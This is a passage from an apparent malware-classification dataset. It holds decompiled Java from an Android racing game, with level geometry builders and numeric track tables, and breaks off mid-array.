"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\LevelJumpyBall.code","public class LevelJumpyBall extends SectionTypesBuilder {   private static final double DHO=0.15d;   private static final double HO=0.3d;   private static final int M=4;   private static final int NBC=8;   private static HashMap<String,SectionType> types=null;   public static void init(){     types=new HashMap<>();   }   public static SectionType getType(  String mapLine,  int texture){     if (types.containsKey(mapLine)) {       return types.get(mapLine);     }     double[] coordsXbase={-17.0d,-16.0d,-16.0d,-14.0d,-12.0d,-10.0d,-8.0d,-6.0d,-4.0d,-2.0d,0.0d,2.0d,6.0d,8.0d,10.0d,12.0d,14.0d,16.0d,17.0d,17.0d,12.0d};     double[] coordsYbase={-6.0d,-0.2d,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,HO,-0.2d,-9.0d};     int[] texXbase={7,6,5,3,5,3,5,3,5,3,5,3,5,3,5,3,5,3,5,6,7};     float[] texYbase={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     int[] finSegbase=new int[21];     finSegbase[20]=1;     int nbPointsBase=coordsXbase.length;     int nbTexBase=texXbase.length;     int nbPoints=0;     int nbFaces=0;     int nbTex=0;     char[] chars=mapLine.toCharArray();     for (int i=0; i < 8; i++) {       if (chars[i] != ' ' && chars[i] >= '0' && chars[i] <= '9') {         nbPoints+=15;         nbFaces+=11;         nbTex+=15;       }     }     double[] coordsX=new double[nbPointsBase + nbPoints];     double[] coordsY=new double[nbPointsBase + nbPoints];     int[] texX=new int[nbTexBase + nbTex];     int[] finSeg=new int[nbTexBase + nbFaces];     float[] texY=new float[nbTexBase + nbTex];     addAll(coordsX,0,coordsXbase);     addAll(coordsY,0,coordsYbase);     addAll(texX,0,texXbase);     addAll(texY,0,texYbase);     addAll(finSeg,0,finSegbase);     int p=nbPointsBase;     int t=nbTexBase;     int f=nbTexBase;     for (int i2=0; i2 < 8; i2++) {       if (chars[i2] != ' ' && chars[i2] >= '0' && chars[i2] <= '9') {         float h=chars[i2] - '0';         double[] coordsXcase={i2 - 4,i2 - 4,i2 - 4,(i2 - 4) + 0.5d,(i2 - 4) + 1,(i2 - 4) + 1,(i2 - 4) + 1,i2 - 4,i2 - 4,(i2 - 4) + 1,(i2 - 4) + 1,i2 - 4,i2 - 4,(i2 - 4) + 1,(i2 - 4) + 1};         double[] coordsYcase={HO,DHO,-h,-h,-h,DHO,HO,DHO,-h,DHO,-h,HO,DHO,HO,DHO};         int[] texXcase={3,2,1,0,1,2,3,7,7,8,8,8,8,9,9};         float[] texYcase={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};         int[] finSegcase={0,0,0,0,0,0,1,2,3,2,3};         addAll(coordsX,p,coordsXcase);         addAll(coordsY,p,coordsYcase);         addAll(texX,t,texXcase);         addAll(texY,t,texYcase);         addAll(finSeg,f,finSegcase);         p+=coordsXcase.length;         t+=texXcase.length;         f+=finSegcase.length;       }     }     float[] fogColor={0.84313726f,0.9098039f,0.9372549f,1.0f};     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.setTexture(texture);     types.put(mapLine,result);     return result;   }   public static void addAll(  double[] a,  int pos,  double[] b){     for (int i=0; i < b.length; i++) {       a[pos + i]=b[i];     }   }   public static void addAll(  int[] a,  int pos,  int[] b){     for (int i=0; i < b.length; i++) {       a[pos + i]=b[i];     }   }   public static void addAll(  float[] a,  int pos,  float[] b){     for (int i=0; i < b.length; i++) {       a[pos + i]=b[i];     }   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\Tracks.code","public class Tracks {   public static int currentBaseship;   public static int currentLvl;   public static double currentLvlSpeed;   public static int currentMode;   public static int currentTrack;   public static int[] lvlBaseship;   public static int[] lvlScore;   public static double[] lvlSpeed;   public static int[] lvlTrack;   public static int[] lvlType;   public static int mode;   public static int nbLvls;   public static int nbShipUnlocked;   public static int nbTrackUnlocked;   public static int nbTracks;   public static int nbUnlocked;   public static int[] trackEnv;   public static String[] trackNames;   public static String[] trackTexture;   public static double[][] track01={new double[]{30.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.07d,0.005d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,-0.005d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,-0.1d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,1.0d,0.02d,-0.015d,-1000.0d,1000.0d},new double[]{36.0d,0.0d,1.0d,0.02d,0.0015d,-1000.0d,1000.0d},new double[]{6.0d,0.0d,1.0d,-0.11d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.07d,-0.001d,-1000.0d,1000.0d},new double[]{34.0d,0.0d,0.0d,-0.025d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.07d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.01d,0.002d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.07d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,2.0d,0.02d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,2.0d,0.03d,0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,-0.04d,-0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,0.07d,0.0d,-1000.0d,1000.0d},new double[]{40.0d,0.0d,0.0d,0.01d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.05d,0.05d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.07d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.075d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.02d,-0.04d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.02d,0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.05d,-0.01d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.04d,0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.04d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.04d,0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.025d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.01d,-0.04d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track11={new double[]{30.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.037d,-0.005d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.005d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,-0.051d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,1.0d,0.012d,0.025d,-1000.0d,1000.0d},new double[]{36.0d,0.0d,1.0d,-0.022d,-0.0015d,-1000.0d,1000.0d},new double[]{6.0d,0.0d,1.0d,-0.0515d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.037d,0.001d,-1000.0d,1000.0d},new double[]{34.0d,0.0d,0.0d,-0.015d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.037d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.0051d,0.01d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.037d,-0.02d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,2.0d,0.0051d,-0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,-0.024d,0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,0.0d,0.037d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.0d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.013d,0.05d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.037d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.045d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.0d,0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.02d,-0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.025d,-0.01d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.03d,0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.024d,0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,-0.025d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.01d,0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track21={new double[]{15.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,0.0d,0.05d,-0.05d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.05d,0.05d,-1000.0d,1000.0d},new double[]{35.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,0.0d,0.0d,-0.05d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.0d,0.1d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.05d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,10.0d,0.0d,0.0d,-0.05d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.025d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.08d,0.0d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{40.0d,20.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.08d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,1.0d,0.1d,-0.1d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.04d,0.05d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.02d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,10.0d,0.0d,-0.02d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.01d,0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.03d,0.02d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.01d,0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.02d,0.04d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.02d,-0.05d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.03d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,10.0d,0.0d,-0.01d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track22={new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.05d,-0.06d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.05d,0.06d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,-0.02d,-0.06d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.08d,0.06d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,-0.02d,-0.06d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,-0.03d,0.06d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,-0.03d,-0.06d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,-0.04d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,0.0d,0.0d,-0.05d,-1000.0d,1000.0d},new double[]{24.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,0.02d,0.05d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,10.0d,0.0d,0.02d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,5.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,10.0d,0.0d,0.02d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,6.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,10.0d,0.0d,0.02d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.05d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,0.0d,0.0d,-0.15d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,0.0d,0.0d,0.15d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,0.0d,0.0d,-0.15d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,0.0d,0.0d,0.15d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,0.0d,0.0d,-0.15d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,0.0d,0.0d,0.15d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.03d,0.0d,-1000.0d,1000.0d},new double[]{13.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{19.0d,0.0d,0.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track31={new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.0d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.025d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.025d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.0d,-150.0d,1000.0d},new double[]{10.0d,10.0d,0.0d,0.0d,0.02d,-150.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.06d,-150.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.06d,-150.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.06d,-150.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.06d,-150.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.06d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.03d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.05d,-0.01d,-150.0d,1000.0d},new double[]{100.0d,0.0d,1.0d,0.01d,0.0d,-150.0d,1000.0d},new double[]{20.0d,10.0d,0.0d,0.0d,0.0d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.02d,-0.03d,-150.0d,1000.0d},new double[]{50.0d,0.0d,0.0d,0.02d,0.02d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.02d,-0.03d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.02d,0.005d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,-0.002d,-150.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.0d,-150.0d,1000.0d},new double[]{10.0d,17.0d,0.0d,0.02d,0.03d,-150.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.01d,-0.0275d,-150.0d,0.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.0d,-150.0d,0.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,0.0d}};   public static double[][] track32={new double[]{10.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,0.08d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.0d,-0.04d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.03d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,-0.04d,-0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.0d,0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,-0.05d,0.01d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.04d,0.08d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,2.0d,0.04d,-0.04d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,-0.04d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.05d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,2.0d,0.0d,-0.04d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{19.0d,0.0d,2.0d,0.0d,0.04d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,15.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.06d,-0.05d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.03d,0.025d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.03d,-0.02d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,-0.06d,-0.02d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.0d,0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.0d,0.02d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,-0.04d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,5.0d,0.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,5.0d,0.0d,0.04d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,5.0d,0.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track41={new double[]{20.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,3.0d,0.02d,0.02d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.02d,-0.01d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.03d,0.06d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.0d,-0.08d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.02d,0.055d,-1000.0d,1000.0d},new double[]{15.0d,8.0d,2.0d,-0.02d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,2.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.01d,0.02d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.03d,-0.01d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,3.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,3.0d,0.0d,-0.015d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,3.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.03d,0.01d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,4.0d,-0.05d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.01d,0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.02d,-0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.02d,-0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.01d,-0.015d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,4.0d,-0.06d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,4.0d,-0.04d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.01d,-0.03d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.03d,0.03d,-1000.0d,1000.0d},new double[]{15.0d,8.0d,2.0d,0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,2.0d,0.0d,-0.01d,-1000.0d,1000.0d},new double[]{25.0d,0.0d,1.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.07d,0.01d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,4.0d,-0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,-0.006d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] track42={new double[]{10.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,0.08d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.08d,-0.04d,-1000.0d,1000.0d},new double[]{20.0d,7.0d,2.0d,-0.03d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,3.0d,0.04d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,3.0d,0.04d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,3.0d,0.08d,0.0d,-1000.0d,1000.0d},new double[]{8.0d,0.0d,3.0d,0.04d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,3.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,-0.04d,0.05d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,1.0d,-0.04d,-0.025d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,3.0d,-0.05d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,1.0d,0.0d,0.05d,-1000.0d,1000.0d},new double[]{19.0d,0.0d,1.0d,0.01d,-0.04d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,1.0d,-0.04d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,7.0d,2.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,1.0d,0.0d,-0.06d,-0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,-0.02d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.02d,-0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.06d,0.06d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,0.02d,-0.03d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.08d,0.0d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,1.0d,0.0d,-0.0d,-1000.0d,1000.0d},new double[]{5.0d,1.0d,4.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,4.0d,-0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,4.0d,-0.04d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,4.0d,-0.03d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.04d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,1.0d,-0.02d,0.0d,-1000.0d,1000.0d},new double[]{-1.0d,0.0d,1.0d,0.0d,0.0d,-1000.0d,1000.0d}};   public static double[][] trackTest={new double[]{30.0d,0.0d,0.0d,0.01d,0.0d,-1000.0d,1000.0d},new double[]{15.0d,0.0d,0.0d,0.0037d,-0.0d,-1000.0d,1000.0d},new double[]{5.0d,0.0d,0.0d,0.0d,0.0d,-1000.0d,1000.0d},new double[]{10.0d,0.0d,0.0d,-0.051d,0.0d,-1000.0d,1000.0d},new double[]{4.0d,0.0d,0.0d,0.012d,0.0d,-1000.0d,1000.0d},new double[]{36.0d,0.0d,0.0d,-0.022d,-0.0d,-1000.0d,1000.0d},new double[]{6.0d,0.0d,0.0d,-0.00515d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0037d,0.0d,-1000.0d,1000.0d},new double[]{34.0d,0.0d,0.0d,-0.015d,0.0d,-1000.0d,1000.0d},new double[]{20.0d,0.0d,0.0d,0.0037d,0.0d,-1000.0d,1000.0d},new double[]{30.0d,0.0d,0.0d,0.0051d,0.0d,-1000.0d,1000.0d},new 